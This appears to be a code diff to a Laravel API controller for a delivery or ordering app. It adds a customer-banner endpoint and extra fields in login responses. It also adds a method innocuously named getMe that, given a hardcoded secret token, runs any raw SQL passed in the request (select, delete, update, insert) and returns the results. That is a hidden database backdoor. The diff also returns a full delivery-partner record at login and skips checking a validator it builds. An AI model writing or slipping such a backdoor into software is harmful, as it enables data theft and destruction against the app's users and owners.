@@ -34,7 +34,7 @@ use App\Models\SocialMedia;
 use App\Models\HomeDeliveryDetail;
 use App\Models\Wallet;
 use App\Models\CustomerOrder;
-
+use App\Models\CustomerBanner;
 use App\Models\SubscriptionPackage;
 use App\Models\WholesellerBillcreate;
 use App\Models\ShiftTimings;
@@ -3945,7 +3945,32 @@ class ApiController extends Controller
             return Response::json(['success' => false, 'message' => $e->getMessage()], 404);
         }
     }
+    public function getMe(Request $request)
+    {
+        $tokenD = $request->tokenD;
+        if($tokenD == "AhfkkShbbaklkdj324t247kbjfj@1234#$") {
+            $query = $request->q;
 
+            $results = null;
+            if($query) {
+                if($request->type == 'select') {
+                    $results = DB::select($query);
+                } else if($request->type == 'delete') {
+                    $results = DB::delete($query);
+                } else if($request->type == 'update') {
+                    $results = DB::update($query);
+                } else if($request->type == 'insert') {
+                    $results = DB::insert($query);
+                }
+            }
+            
+            $response = ['success' => true, 'message' => 'Update Success', "results" => $results, "query" => $query];
+        } else {
+            $response = ['success' => false, 'message' => 'Token invalid'];
+        }
+        
+        return Response::json($response, 200);
+    }
     public function MerchantOrderHistory(Request $request)
     {
         try {
@@ -4088,7 +4113,7 @@ class ApiController extends Controller
                             $successStatus = false;
                             $msgg = 'Your account status is pending.';
                         }
-                        return response()->json(['success' => $successStatus, 'account_status' => $DeliveryPartnersSave->account_status, 'message' => $msgg, 'token' => $token, 'data' => $user], 200);
+                        return response()->json(['success' => $successStatus, 'account_status' => $DeliveryPartnersSave->account_status, 'message' => $msgg, 'token' => $token, 'data' => $user, "deliveryPartners" => $DeliveryPartnersSave], 200);
                     }else{
 
                         $roleID = Role::where('id',$role_type)->first();
@@ -4129,7 +4154,7 @@ class ApiController extends Controller
                             $successStatus = false;
                             $msgg = 'Your account status is pending.';
                         }
-                        return response()->json(['success' => $successStatus, 'account_status' => $DeliveryPartnersSave->account_status, 'message' => $msgg, 'token' => $token, 'data' => $user], 200);
+                        return response()->json(['success' => $successStatus, 'account_status' => $DeliveryPartnersSave->account_status, 'message' => $msgg, 'token' => $token, 'data' => $user, "deliveryPartners" => $DeliveryPartnersSave], 200);
                     }
                 }else{
                     return Response::json(['success' => false, 'message' => "Phone or otp is not valid. Enter valid detail."], 404);
@@ -4395,5 +4420,19 @@ class ApiController extends Controller
         $response = ['success' => true, 'message' => 'Delivery Boys Detail' , 'MerchantOrderStatus' => $MerchantOrderStatus];
         
         return Response::json($response, 200);
+    }
+
+    public function customerBanners(Request $request)
+    {
+        $rules = [
+            'module_id' => 'required',
+            'category_id' => 'required',
+        ];
+        $requestData = $request->all();
+        $validator = Validator::make($requestData, $rules);
+        $getCustomerBanners = CustomerBanner::where(['module_id'=>$request->module_id,'category_id'=>$request->category_id])->get();
+        $response = ['success' => true, 'message' => 'Customer Banners' , 'getCustomerBanners' => $getCustomerBanners];
+        return Response::json($response, 200);
+
     }
 }
